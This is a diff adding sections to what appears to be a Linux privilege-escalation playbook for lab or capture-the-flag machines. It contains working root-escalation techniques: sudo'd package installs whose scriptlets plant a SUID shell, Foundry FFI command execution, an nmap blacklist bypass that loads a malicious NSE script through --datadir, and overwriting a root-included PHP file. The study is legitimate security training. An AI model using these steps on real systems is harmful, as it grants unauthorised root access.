@@ -99,6 +99,24 @@ escalation is a *documented feature* — name the blanket sudo rule as the findi
 not the tool. *Compact example:* `cd /var/www/html && sudo /usr/local/bin/bee
 eval 'system("id");'` → uid=0. *(Backdrop `bee`)*
 
+**Two more families that are code-eval CLIs in disguise: build/test toolchains and
+package managers.** A sudo rule to a *developer toolchain* is a shell because these tools
+ship a first-class "run an arbitrary command" primitive: Foundry `forge script … --ffi`
+(and `cast`) execute OS commands via the Solidity FFI cheatcode (`vm.ffi(["/bin/bash","-c",
+…])`) once `ffi = true` is set in a `foundry.toml` you control — point the sudo rule's tool
+at a throwaway project and it runs your command as the target user. The same shape applies
+to `make`/`cmake` (custom build commands), `ansible`/`salt` (modules), and language test
+runners. Separately, a sudo rule to an **OS package manager that installs *local* files**
+is root code execution through *install scriptlets*: `pacman -U evil.pkg.tar.zst`
+(`post_install(){ … }`), `dpkg -i evil.deb` (`postinst`), `rpm -i evil.rpm` (`%post`). Build
+the package locally as the unprivileged user (`makepkg`/`dpkg-deb`/`rpmbuild` — check they
+exist) with a scriptlet that drops a SUID shell, adds an authorized_key, or reads the flag,
+then install under sudo. *Compact example:* `makepkg -df --skipinteg && sudo pacman -U
+--noconfirm pwn-1-1-any.pkg.tar.zst` with `post_install(){ cp /bin/bash /usr/local/bin/rb;
+chmod 4755 /usr/local/bin/rb; }`. **SUID-payload gotcha:** `/tmp` and `/dev/shm` are often
+`nosuid` — land the SUID binary on a mount that allows it (`/` → `/usr/local/bin`), or the
+euid-0 bit is silently ignored. As always, name the blanket sudo rule as the finding.
+
 **A sudo-allowed binary whose *job* is to spawn a session is a root shell —
 even when GTFOBins has no entry for it.** Separate from code-eval CLIs: some
 programs exist precisely to hand a connecting client an interactive login shell
@@ -166,6 +184,30 @@ nc -u -w1 127.0.0.1 N`, and drop a root-owned `/etc/sudoers.d/<uuid>` (visudo
 tolerates the pcap junk on line 1 and applies your rule on the next). Don't
 conclude a constrained `-w`+priv-drop is a dead end before testing flag injection
 through the wildcard.
+
+**A sudo rule may point at a *wrapper* that blacklists the dangerous flags and
+execs the real tool — treat the blacklist as a hint, not a wall, and bypass it
+through the tool's plugin/data-directory mechanism rather than the named flag.**
+When `sudo -l` shows `NOPASSWD: /usr/bin/<tool> *` and `<tool>` turns out to be a
+short shell script (`file $(command -v tool)`), read it: the common shape is a
+substring blacklist (`for o in --script -iL -oG; do [[ "$*" == *"$o"* ]] && exit;
+done; exec /usr/bin/tool.original "$@"`) which is weak twice over — it blocks only
+the *literal* strings it lists, and the real binary underneath still has every
+capability. Don't stop at the obvious GTFOBins flags it already blocks; ask how
+*else* the tool loads code. Most extensible tools read scripts/plugins from a
+**data directory** you can redirect, and the flag that selects the plugin
+*category* is usually not the one on the blacklist:
+- **nmap**: `--script` blocked → use `-sC` (alias for `--script=default`, the
+  literal `--script` never appears) together with `--datadir <dir>`, where
+  `<dir>/scripts/script.db` is your own index declaring a malicious `.nse` to be
+  in the `default` category. nmap loads and runs it as root (`prerule=function()
+  return true end; action=function() os.execute("...") end`). liblua present in
+  the real binary is the only prerequisite — check `tool.original --version`.
+  Prefix tricks (`--scrip`) fail: the shortest unambiguous prefix *is* the blocked
+  string. *(unrested: `/usr/bin/nmap` wrapper, real nmap 7.80)*
+- The general move: whenever a wrapper blacklists a tool's `--script`/`--exec`/
+  `-e`, look for `--datadir`/`--config`/`--plugin-dir`/`--rcfile`/`-I` that makes
+  it read attacker-controlled code *without* the banned token.
 
 **When the rule is *unconstrained* (`NOPASSWD: /usr/sbin/tcpdump` with no fixed
 args), skip the flag-smuggling entirely — `-z <cmd>` is direct command execution
@@ -446,7 +488,15 @@ sudo <tool> logs x                          # cats root's private key → ssh ro
 ```
 
 You need write in the directory the tool reads — own it, or reach it as the tool's
-service user (a lateral step is often exactly for this). The same flaw enables an
+service user (a lateral step is often exactly for this). **Mind
+`fs.protected_symlinks` on the intermediate hops**: when it is enabled (the modern
+default), root will *not* follow a symlink you own that sits in a sticky,
+world-writable directory (`/tmp`, `/dev/shm`) — the root `cat`/`open` silently
+reads nothing, which looks exactly like a failed exploit. Stage every hop in a
+directory *you* own that is **not** sticky-and-world-writable (your home, or a
+subdir you `mkdir`), and root follows the chain normally. If a symlink read as
+root returns empty while the same read as your user returns content, suspect this
+before you suspect the chain. The same flaw enables an
 arbitrary-write variant when the root job *writes* through the first-hop-checked
 name. The clean fix is `realpath`/`readlink -f` + a prefix-containment test, so
 name that as the vulnerability. **Prefer this read/logic flaw to racing a
@@ -503,6 +553,22 @@ copy the script to a root-only path, checksum *that copy*, exec *that copy* — 
 simply make the directory root-owned and non-group-writable. Validating a file an
 unprivileged group can swap is not a boundary. Prefer this to any write race
 elsewhere, and it is cleaner than a kernel bug.
+
+**No race at all when a root process *includes/sources* a file you can write.**
+The simplest shape of this bug: a root-run interpreter re-reads a code file on
+every request — `php -S ... -t /app` run as root whose `index.php` does
+`include('config/configuration.php')`, a daemon that `source`s a `.env`/`.sh`, a
+cron that `. /path/conf`. If that included file (not just its directory) is
+group-writable and you are in the group, overwrite it with code and trigger the
+read — for a web server that is one `curl http://127.0.0.1:<port>/`. No checksum
+window to win. Enumerate it with `for g in $(id -Gn); do find / -group "$g" ...`
+(top of this file) the moment you land in an unusual group, then confirm the
+consumer: `ps aux | grep -E 'php -S|python.*http|<daemon>'` for who runs it as
+root and `grep -n 'include\|require\|source\|\.\ ' <its entrypoint>` for the read.
+Keep any constant the file legitimately defines (e.g. a `define('PATH',…)`) in
+your payload so the app still works, back up the original, and restore it with the
+root you just gained — the group-write survives a box reset but your edit should
+not outlive the engagement.
 
 When the target you gain write to is `/etc/passwd`, **append a UID-0 line and
 delete it afterward — never `cp`-overwrite.** Public PoCs clobber the whole file
